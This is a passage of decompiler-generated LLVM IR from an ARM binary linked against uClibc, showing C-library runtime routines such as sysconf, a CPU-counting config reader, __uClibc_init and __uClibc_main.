  %v1_ca00 = inttoptr i32 %v2_c9fc to i8*
  %v2_ca00 = load i8, i8* %v1_ca00, align 1
  %v7_ca04 = icmp eq i8 %v2_ca00, 99
  br i1 %v7_ca04, label %dec_label_pc_ca0c, label %.backedge3

dec_label_pc_ca0c:                                ; preds = %dec_label_pc_c9f8
  %v1_ca0c = add i32 %v2_c9fc, 1
  %v2_ca0c = inttoptr i32 %v1_ca0c to i8*
  %v3_ca0c = load i8, i8* %v2_ca0c, align 1
  %v7_ca10 = icmp eq i8 %v3_ca0c, 112
  br i1 %v7_ca10, label %dec_label_pc_ca18, label %.backedge3

dec_label_pc_ca18:                                ; preds = %dec_label_pc_ca0c
  %v1_ca18 = add i32 %v2_c9fc, 2
  %v2_ca18 = inttoptr i32 %v1_ca18 to i8*
  %v3_ca18 = load i8, i8* %v2_ca18, align 1
  %v7_ca1c = icmp eq i8 %v3_ca18, 117
  br i1 %v7_ca1c, label %dec_label_pc_ca24, label %.backedge3

dec_label_pc_ca24:                                ; preds = %dec_label_pc_ca18
  %v1_ca24 = add i32 %v2_c9fc, 3
  %v2_ca24 = inttoptr i32 %v1_ca24 to i8*
  %v3_ca24 = load i8, i8* %v2_ca24, align 1
  %v4_ca24 = zext i8 %v3_ca24 to i32
  %v0_ca28 = load i32, i32* @r4, align 4
  %v1_ca28 = load i32, i32* @sl, align 4
  %v2_ca28 = add i32 %v1_ca28, %v0_ca28
  %v3_ca28 = inttoptr i32 %v2_ca28 to i32*
  %v4_ca28 = load i32, i32* %v3_ca28, align 4
  %v2_ca2c = mul nuw nsw i32 %v4_ca24, 2
  %v2_ca30 = add i32 %v4_ca28, %v2_ca2c
  %v3_ca30 = inttoptr i32 %v2_ca30 to i16*
  %v4_ca30 = load i16, i16* %v3_ca30, align 2
  %v1_ca34 = and i16 %v4_ca30, 8
  %v2_ca34 = icmp eq i16 %v1_ca34, 0
  br i1 %v2_ca34, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_ca24
  %v1_ca38 = load i32, i32* @r5, align 4
  %v2_ca38 = add i32 %v1_ca38, 1
  store i32 %v2_ca38, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_ca24, %dec_label_pc_c9f8, %dec_label_pc_ca0c, %dec_label_pc_ca18
  %v0_ca3c.pre = load i32, i32* @r6, align 4
  %v0_ca48.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_c9e4
  %v0_ca48 = phi i32 [ %v0_ca48.pre, %.backedge3 ], [ %v2_c9ec, %dec_label_pc_c9e4 ]
  %v0_ca3c = phi i32 [ %v0_ca3c.pre, %.backedge3 ], [ %v1_c9d8, %dec_label_pc_c9e4 ]
  %v4_ca4c = inttoptr i32 %v0_ca3c to i32*
  %v5_ca4c = call i32 @__GI_config_read(i32* %v4_ca4c, i32 %v2_c9f0, i32 258, i32 %v0_ca48)
  %v2_ca50 = icmp eq i32 %v5_ca4c, 0
  br i1 %v2_ca50, label %dec_label_pc_cac0, label %dec_label_pc_c9f8

dec_label_pc_ca5c:                                ; preds = %entry
  %v0_ca60 = load i32, i32* @r4, align 4
  %v2_ca60 = add i32 %v0_ca60, -37420
  store i32 %v2_ca60, i32* @r0, align 4
  %v1_ca64 = call i32 @__GI_config_open(i32 %v2_ca60)
  store i32 %v1_ca64, i32* @r6, align 4
  %v2_ca68 = icmp eq i32 %v1_ca64, 0
  br i1 %v2_ca68, label %bb19, label %dec_label_pc_ca74

bb19:                                             ; preds = %dec_label_pc_ca5c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_cac0

dec_label_pc_ca74:                                ; preds = %dec_label_pc_ca5c
  %v0_ca78 = load i32, i32* @r4, align 4
  %v2_ca78 = add i32 %v0_ca78, -37404
  store i32 %v2_ca78, i32* @r8, align 4
  %v2_ca80 = add i32 %v0_ca78, -37368
  store i32 %v2_ca80, i32* @r7, align 4
  %v2_ca84 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_ca84, i32* @r4, align 4
  br label %bb21

dec_label_pc_ca8c:                                ; preds = %bb21
  %v0_cab8 = load i32, i32* @r8, align 4
  %v3_ca8c = load i32, i32* %stack_var_-36, align 4
  %v1_ca90 = inttoptr i32 %v3_ca8c to i32*
  %v2_ca90 = load i32, i32* %v1_ca90, align 4
  store i32 %v2_ca90, i32* @r1, align 4
  %v2_ca94 = inttoptr i32 %v0_cab8 to i8*
  %v3_ca94 = call i32 @__GI_strcoll(i8* %v2_ca94, i32 %v2_ca90)
  %v2_ca98 = icmp eq i32 %v3_ca94, 0
  br i1 %v2_ca98, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_ca8c
  %v1_ca9c = load i32, i32* @r5, align 4
  %v2_ca9c = add i32 %v1_ca9c, 1
  store i32 %v2_ca9c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_ca8c
  %v0_caa8.pre = load i32, i32* @r7, align 4
  %v0_caac.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_ca74
  %v0_caac = phi i32 [ %v0_caac.pre, %.backedge ], [ %v1_ca64, %dec_label_pc_ca74 ]
  %v0_caa8 = phi i32 [ %v0_caa8.pre, %.backedge ], [ %v2_ca80, %dec_label_pc_ca74 ]
  %v4_cab0 = inttoptr i32 %v0_caac to i32*
  %v5_cab0 = call i32 @__GI_config_read(i32* %v4_cab0, i32 %v2_ca84, i32 459266, i32 %v0_caa8)
  %v2_cab4 = icmp eq i32 %v5_cab0, 0
  br i1 %v2_cab4, label %dec_label_pc_cac0, label %dec_label_pc_ca8c

dec_label_pc_cac0:                                ; preds = %bb18, %bb21, %bb19
  %v0_cac0 = load i32, i32* @r6, align 4
  %v1_cac4 = inttoptr i32 %v0_cac0 to i32*
  %v2_cac4 = call i32 @__GI_config_close(i32* %v1_cac4)
  %v0_cac8 = load i32, i32* @r5, align 4
  %v2_cac8 = icmp eq i32 %v0_cac8, 0
  %.v0_cac8 = select i1 %v2_cac8, i32 1, i32 %v0_cac8
  ret i32 %.v0_cac8

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_cac0, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_ceec

bb:                                               ; preds = %entry
  %v7_cb18 = mul i32 %arg1, 4
  %v8_cb18 = add i32 %v7_cb18, ptrtoint (i32* @global_var_cb20.173 to i32)
  call void @__pseudo_branch(i32 %v8_cb18)
  br label %dec_label_pc_ceec

dec_label_pc_ceec:                                ; preds = %bb, %entry
  %v0_ceec = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_cef8 = inttoptr i32 %v0_ceec to i32*
  store i32 22, i32* %v2_cef8, align 4
  %v0_d0a8 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_d0a8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_d0ec = add i32 %tmp, 4
  %v4_d0ec = inttoptr i32 %v3_d0ec to i32*
  store i32 %arg3, i32* %v4_d0ec, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_d0f8 = icmp eq i32 %arg2, 0
  br i1 %v2_d0f8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_d104 = add i32 %tmp, 4
  %v3_d104 = inttoptr i32 %v2_d104 to i32*
  %v4_d104 = load i32, i32* %v3_d104, align 4
  store i32 %v4_d104, i32* %r0.global-to-local, align 4
  %v3_d108 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_d108, %bb ], [ undef, %entry ]
  %v2_d110 = xor i1 %v2_d0f8, true
  call void @__pseudo_cond_branch(i1 %v2_d110, i32 %.02)
  %v1_d11c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_d11c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_d144.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_d120 = load i32, i32* @r4, align 4
  store i32 %v3_d120, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d144

dec_label_pc_d144:                                ; preds = %dec_label_pc_d144.dec_label_pc_d144_crit_edge, %dec_label_pc_d144.lr.ph
  %v1_d144 = phi i32 [ %v1_d150, %dec_label_pc_d144.dec_label_pc_d144_crit_edge ], [ 0, %dec_label_pc_d144.lr.ph ]
  %v0_d144 = phi i32 [ %v0_d144.pre, %dec_label_pc_d144.dec_label_pc_d144_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -8), %dec_label_pc_d144.lr.ph ]
  %v4_d144 = mul i32 %v1_d144, 4
  %v5_d144 = add i32 %v4_d144, %v0_d144
  %v6_d144 = inttoptr i32 %v5_d144 to i32*
  %v7_d144 = load i32, i32* %v6_d144, align 4
  call void @__pseudo_branch(i32 %v7_d144)
  %v0_d150 = load i32, i32* %r4.global-to-local, align 4
  %v1_d150 = add i32 %v0_d150, -1
  store i32 %v1_d150, i32* %r4.global-to-local, align 4
  %v2_d150 = icmp eq i32 %v0_d150, 0
  br i1 %v2_d150, label %dec_label_pc_d158, label %dec_label_pc_d144.dec_label_pc_d144_crit_edge

dec_label_pc_d144.dec_label_pc_d144_crit_edge:    ; preds = %dec_label_pc_d144
  %v0_d144.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_d144

dec_label_pc_d158:                                ; preds = %dec_label_pc_d144
  %v0_d15c.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_d15c = add i32 %v0_d15c.pre, 1292
  %v3_d15c = inttoptr i32 %v2_d15c to i32*
  %v4_d15c = load i32, i32* %v3_d15c, align 4
  %v2_d160 = icmp eq i32 %v4_d15c, 0
  br i1 %v2_d160, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_d158
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_d158, %bb
  %v2_d168 = xor i1 %v2_d160, true
  call void @__pseudo_cond_branch(i1 %v2_d168, i32 %v4_d15c)
  %v0_d170 = load i32, i32* %r5.global-to-local, align 4
  %v2_d170 = add i32 %v0_d170, 1296
  %v3_d170 = inttoptr i32 %v2_d170 to i32*
  %v4_d170 = load i32, i32* %v3_d170, align 4
  %v2_d174 = icmp eq i32 %v4_d170, 0
  br i1 %v2_d174, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_d17c = xor i1 %v2_d174, true
  call void @__pseudo_cond_branch(i1 %v2_d17c, i32 %v4_d170)
  %v2_d180 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_d180, i32* %r4.global-to-local, align 4
  %v1_d184 = load i32, i32* @r0, align 4
  ret i32 %v1_d184

; uselistorder directives
  uselistorder i32 %v1_d150, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_d1b0 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_d1b8 = icmp eq i32 %v2_d1b0, -1
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r3, align 4
  br i1 %v3_d1b8, label %dec_label_pc_d1c4, label %dec_label_pc_d1dc

dec_label_pc_d1c4:                                ; preds = %entry
  %v0_d1c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_d1d0 = call i32 @__GI_open(i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 -37364), i32 %v0_d1c8)
  %v1_d1d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_d1d8 = icmp ne i32 %v2_d1d0, %v1_d1d4
  call void @__pseudo_cond_branch(i1 %v1_d1d8, i32 ptrtoint (i32* @global_var_bfec.189 to i32))
  br label %dec_label_pc_d1dc

dec_label_pc_d1dc:                                ; preds = %entry, %dec_label_pc_d1c4
  %v1_d1e4 = phi i32 [ %v2_d1b0, %entry ], [ %v2_d1d0, %dec_label_pc_d1c4 ]
  ret i32 %v1_d1e4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d1dc, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r4.global-to-local, align 4
  %v4_d200 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 96) to i32*), align 4
  %v1_d204 = inttoptr i32 %v4_d200 to i32*
  %v2_d204 = load i32, i32* %v1_d204, align 4
  %v2_d208 = icmp eq i32 %v2_d204, 0
  br i1 %v2_d208, label %dec_label_pc_d210, label %dec_label_pc_d244

dec_label_pc_d210:                                ; preds = %entry
  %v4_d214 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 56) to i32*), align 4
  %v2_d21c = icmp eq i32 %v4_d214, 0
  store i32 4096, i32* %v1_d204, align 4
  br i1 %v2_d21c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_d210
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_d210, %bb
  %v2_d228 = xor i1 %v2_d21c, true
  call void @__pseudo_cond_branch(i1 %v2_d228, i32 %v4_d214)
  %v0_d230 = load i32, i32* %r4.global-to-local, align 4
  %v2_d230 = add i32 %v0_d230, -68280
  %v2_d238 = icmp eq i32 %v2_d230, 0
  br i1 %v2_d238, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_d240 = xor i1 %v2_d238, true
  call void @__pseudo_cond_branch(i1 %v2_d240, i32 %v2_d230)
  br label %dec_label_pc_d244

dec_label_pc_d244:                                ; preds = %entry, %bb6
  %v1_d248 = load i32, i32* @r0, align 4
  ret i32 %v1_d248

; uselistorder directives
  uselistorder label %dec_label_pc_d244, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_d264 = add i32 %tmp, 4
  store i32 %v1_d264, i32* %ip.global-to-local, align 4
  %v2_d268 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r6, align 4
  %v3_d274 = mul i32 %arg2, 4
  store i32 %v3_d274, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_d27c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 20) to i32*), align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_d284 = ptrtoint i32* %stack_var_-120 to i32
  %v4_d288 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 28) to i32*), align 4
  store i32 %v4_d288, i32* %r4.global-to-local, align 4
  %v2_d290 = add i32 %v1_d264, %v3_d274
  store i32 %v2_d290, i32* %ip.global-to-local, align 4
  %v9_d294 = icmp eq i32 %v2_d290, %v2_d268
  store i1 %v9_d294, i1* %cpsr_z.global-to-local, align 1
  %v2_d298 = inttoptr i32 %v4_d27c to i32*
  store i32 %arg7, i32* %v2_d298, align 4
  store i32 1296, i32* %r2.global-to-local, align 4
  %v0_d2a4 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_d294, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_d2a8 = load i32, i32* @r7, align 4
  %v2_d2a8 = load i32, i32* %r5.global-to-local, align 4
  %v3_d2a8 = add i32 %v2_d2a8, %v1_d2a8
  store i32 %v3_d2a8, i32* %r3.global-to-local, align 4
  %v1_d2ac = load i32, i32* @r6, align 4
  %v3_d2ac = add i32 %v1_d2ac, 1296
  %v4_d2ac = inttoptr i32 %v3_d2ac to i32*
  store i32 %arg6, i32* %v4_d2ac, align 4
  %v0_d2b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_d2b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_d2b0 = inttoptr i32 %v1_d2b0 to i32*
  store i32 %v0_d2b0, i32* %v2_d2b0, align 4
  store i32 120, i32* @r2, align 4
  %v1_d2bc = load i32, i32* %r3.global-to-local, align 4
  %v2_d2bc = load i32, i32* %r4.global-to-local, align 4
  %v3_d2bc = inttoptr i32 %v2_d2bc to i32*
  store i32 %v1_d2bc, i32* %v3_d2bc, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_d2ac.c = load i32, i32* @r6, align 4
  %v3_d2ac.c = add i32 %v1_d2ac.c, 1296
  %v4_d2ac.c = inttoptr i32 %v3_d2ac.c to i32*
  store i32 %arg6, i32* %v4_d2ac.c, align 4
  %v0_d2b0.c = load i32, i32* %ip.global-to-local, align 4
  %v1_d2b0.c = load i32, i32* %r4.global-to-local, align 4
  %v2_d2b0.c = inttoptr i32 %v1_d2b0.c to i32*
  store i32 %v0_d2b0.c, i32* %v2_d2b0.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  %v2_d2c8 = bitcast i32* %stack_var_-120 to i8*
  %v3_d2c8 = call i32 @__GI_memset(i8* %v2_d2c8, i32 0)
  %v0_d2cc = load i32, i32* %r4.global-to-local, align 4
  %v1_d2cc = inttoptr i32 %v0_d2cc to i32*
  %storemerge.pre = load i32, i32* %v1_d2cc, align 4
  br label %dec_label_pc_d2d8

dec_label_pc_d2d8:                                ; preds = %dec_label_pc_d2d8, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_d2d8, %dec_label_pc_d2d8 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_d2d8 = inttoptr i32 %storemerge to i32*
  %v2_d2d8 = load i32, i32* %v1_d2d8, align 4
  store i32 %v2_d2d8, i32* %r3.global-to-local, align 4
  %v4_d2d8 = add i32 %storemerge, 4
  store i32 %v4_d2d8, i32* %r2.global-to-local, align 4
  %v2_d2dc = icmp eq i32 %v2_d2d8, 0
  br i1 %v2_d2dc, label %dec_label_pc_d2e8, label %dec_label_pc_d2d8

dec_label_pc_d2e8:                                ; preds = %dec_label_pc_d2d8
  store i32 %v4_d2d8, i32* @r4, align 4
  store i32 %v2_d284, i32* @r5, align 4
  %v1_d30c29 = inttoptr i32 %v4_d2d8 to i32*
  %v2_d30c30 = load i32, i32* %v1_d30c29, align 4
  store i32 %v2_d30c30, i32* %r3.global-to-local, align 4
  %v2_d31032 = icmp eq i32 %v2_d30c30, 0
  store i1 %v2_d31032, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d31032, label %dec_label_pc_d318, label %dec_label_pc_d2f4

dec_label_pc_d2f4:                                ; preds = %dec_label_pc_d2e8, %dec_label_pc_d30c
  %v5_d2f8 = phi i32 [ %v2_d30c, %dec_label_pc_d30c ], [ %v2_d30c30, %dec_label_pc_d2e8 ]
  %v2_d2f4 = icmp ugt i32 %v5_d2f8, 13
  %v7_d2f4 = icmp eq i32 %v5_d2f8, 14
  store i1 %v7_d2f4, i1* %cpsr_z.global-to-local, align 1
  %v2_d2f8 = xor i1 %v2_d2f4, true
  %v3_d2f8 = or i1 %v7_d2f4, %v2_d2f8
  br i1 %v3_d2f8, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_d2f4
  %v6_d2f8 = and i32 %v5_d2f8, 536870912
  %v7_d2f8 = icmp ne i32 %v6_d2f8, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_d2f4, %bb59
  %v1_d304 = phi i1 [ %v2_d2f4, %dec_label_pc_d2f4 ], [ %v7_d2f8, %bb59 ]
  %v2_d2fc = xor i1 %v1_d304, true
  %v3_d2fc = or i1 %v7_d2f4, %v2_d2fc
  br i1 %v3_d2fc, label %bb61, label %dec_label_pc_d30c

bb61:                                             ; preds = %bb60
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d30c

dec_label_pc_d30c:                                ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_d2fc, i32 ptrtoint (i32* @global_var_aca0.198 to i32))
  %v0_d308 = load i32, i32* @r4, align 4
  %v1_d308 = add i32 %v0_d308, 8
  store i32 %v1_d308, i32* @r4, align 4
  %v1_d30c = inttoptr i32 %v1_d308 to i32*
  %v2_d30c = load i32, i32* %v1_d30c, align 4
  store i32 %v2_d30c, i32* %r3.global-to-local, align 4
  %v2_d310 = icmp eq i32 %v2_d30c, 0
  store i1 %v2_d310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d310, label %dec_label_pc_d318, label %dec_label_pc_d2f4

dec_label_pc_d318:                                ; preds = %dec_label_pc_d30c, %dec_label_pc_d2e8
  %v1_d31c = call i32 @_dl_aux_init(i32 %v2_d284)
  store i32 %v1_d31c, i32* @r0, align 4
  %v1_d320 = call i32 @__GI___uClibc_init(i32 %v1_d31c)
  store i32 %v1_d320, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_d32c = load i32, i32* @r6, align 4
  %v2_d32c = add i32 %v0_d32c, 96
  %v3_d32c = inttoptr i32 %v2_d32c to i32*
  %v4_d32c = load i32, i32* %v3_d32c, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_d334 = icmp eq i32 %tmp54, 0
  store i1 %v2_d334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d334, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_d318
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_d318, %bb62
  %v0_d340 = phi i32 [ %tmp54, %dec_label_pc_d318 ], [ 4096, %bb62 ]
  %v3_d33c = icmp eq i32 %tmp53, -1
  %v8_d33c = icmp eq i32 %tmp53, -1
  store i1 %v8_d33c, i1* %cpsr_z.global-to-local, align 1
  %v2_d340 = inttoptr i32 %v4_d32c to i32*
  store i32 %v0_d340, i32* %v2_d340, align 4
  br i1 %v3_d33c, label %dec_label_pc_d348, label %dec_label_pc_d370

dec_label_pc_d348:                                ; preds = %bb63
  %v0_d348 = call i32 @getuid()
  store i32 %v0_d348, i32* @r0, align 4
  store i32 %v0_d348, i32* @r4, align 4
  %v0_d350 = call i32 @geteuid()
  store i32 %v0_d350, i32* @r0, align 4
  %v0_d354 = load i32, i32* @r4, align 4
  %v9_d354 = icmp eq i32 %v0_d354, %v0_d350
  store i1 %v9_d354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d354, label %dec_label_pc_d35c, label %dec_label_pc_d398

dec_label_pc_d35c:                                ; preds = %dec_label_pc_d348
  %v1_d35c = call i32 @getgid(i32 %v0_d350)
  store i32 %v1_d35c, i32* @r0, align 4
  store i32 %v1_d35c, i32* @r4, align 4
  %v0_d364 = call i32 @getegid()
  store i32 %v0_d364, i32* @r0, align 4
  %v0_d368 = load i32, i32* @r4, align 4
  %v9_d368 = icmp eq i32 %v0_d368, %v0_d364
  store i1 %v9_d368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d368, label %dec_label_pc_d370, label %dec_label_pc_d398

dec_label_pc_d370:                                ; preds = %dec_label_pc_d35c, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_d33c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_d33c, label %dec_label_pc_d3bc, label %dec_label_pc_d37c

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d370
  store i32 %tmp52, i32* @r3, align 4
  %v9_d380 = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_d380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d380, label %dec_label_pc_d388, label %dec_label_pc_d398

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_d390 = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_d390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d390, label %dec_label_pc_d3bc, label %dec_label_pc_d398

dec_label_pc_d398:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d35c, %dec_label_pc_d348, %dec_label_pc_d388
  %v2_d3a0 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_d3ac = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_d3b8 = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_d3b8, i32* @r0, align 4
  br label %dec_label_pc_d3bc

dec_label_pc_d3bc:                                ; preds = %dec_label_pc_d388, %dec_label_pc_d370, %dec_label_pc_d398
  %v0_d3bc = load i32, i32* @r7, align 4
  %v1_d3bc = inttoptr i32 %v0_d3bc to i32*
  %v2_d3bc = load i32, i32* %v1_d3bc, align 4
  store i32 %v2_d3bc, i32* %r2.global-to-local, align 4
  store i32 396, i32* %r3.global-to-local, align 4
  %v1_d3c4 = load i32, i32* @r6, align 4
  %v3_d3c4 = add i32 %v1_d3c4, 396
  %v4_d3c4 = inttoptr i32 %v3_d3c4 to i32*
  store i32 %v2_d3bc, i32* %v4_d3c4, align 4
  %v0_d3c8 = load i32, i32* @r7, align 4
  %v1_d3c8 = inttoptr i32 %v0_d3c8 to i32*
  %v2_d3c8 = load i32, i32* %v1_d3c8, align 4
  store i32 %v2_d3c8, i32* @r4, align 4
  %v2_d3cc = icmp eq i32 %v2_d3c8, 0
  store i1 %v2_d3cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d3cc, label %bb65, label %dec_label_pc_d3d4

dec_label_pc_d3d4:                                ; preds = %dec_label_pc_d3bc
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_d3d8 = load i32, i32* @r6, align 4
  %v2_d3d8 = add i32 %v0_d3d8, 116
  %v3_d3d8 = inttoptr i32 %v2_d3d8 to i32*
  %v4_d3d8 = load i32, i32* %v3_d3d8, align 4
  store i32 %v4_d3d8, i32* %r3.global-to-local, align 4
  %v2_d3dc = inttoptr i32 %v4_d3d8 to i32*
  store i32 %v2_d3c8, i32* %v2_d3dc, align 4
  %v0_d3e4 = load i32, i32* @r7, align 4
  %v1_d3e4 = inttoptr i32 %v0_d3e4 to i32*
  %v2_d3e4 = load i32, i32* %v1_d3e4, align 4
  %v4_d3e8 = call i32 @__GI_strrchr(i32 %v2_d3e4, i32 47, i32 %v2_d3bc, i32 %v4_d3d8)
  store i32 %v4_d3e8, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_d3f0 = icmp eq i32 %v4_d3e8, 0
  store i1 %v2_d3f0, i1* %cpsr_z.global-to-local, align 1
  %v0_d3f4 = load i32, i32* @r6, align 4
  %v2_d3f4 = add i32 %v0_d3f4, 64
  %v3_d3f4 = inttoptr i32 %v2_d3f4 to i32*
  %v4_d3f4 = load i32, i32* %v3_d3f4, align 4
